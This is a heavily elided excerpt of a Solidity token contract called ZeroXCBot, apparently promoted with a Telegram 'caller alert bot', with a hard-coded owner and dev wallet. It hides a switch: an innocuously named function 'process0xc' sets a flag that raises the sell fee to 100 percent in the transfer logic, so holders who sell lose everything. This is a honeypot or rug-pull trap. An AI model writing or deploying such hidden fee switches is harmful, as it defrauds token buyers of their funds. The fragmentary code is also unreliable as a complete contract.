...
Caller Alert Bot :@zeroXCaller_alert_bot 
...
abstract contract Ownable is Context {
    ...
    constructor () {
        ...
        _owner = 0xaF120ea7b8375EAC4f12747001Ecc7f155Da1861;
...
contract ZeroXCBot is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0xaF120ea7b8375EAC4f12747001Ecc7f155Da1861);
  ...
  //   TOKEN DETAILS
    ...
    */
    ...
    function process0xc () external virtual {
        oxcsout = 1;
    } 
    ...
    function _transfer(
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = (oxcsout <= 0 ? _sellFee:100);}
